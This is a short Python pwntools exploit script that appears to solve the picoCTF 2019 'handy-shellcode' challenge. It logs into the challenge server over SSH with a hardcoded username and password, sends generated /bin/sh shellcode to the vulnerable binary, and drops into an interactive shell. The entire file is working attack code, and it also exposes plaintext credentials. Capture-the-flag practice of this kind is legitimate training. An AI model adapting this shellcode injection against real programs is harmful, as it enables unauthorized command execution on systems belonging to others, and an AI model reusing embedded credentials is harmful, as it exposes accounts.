#coding=utf-8
from pwn import *

context.binary = './vuln'
debug = 0
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user='zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/handy-shellcode_6_435fbf05d96b7377b5005d15bc542d30')
    p = s.process('./vuln')

p.sendline(asm(shellcraft.sh()))
p.interactive()
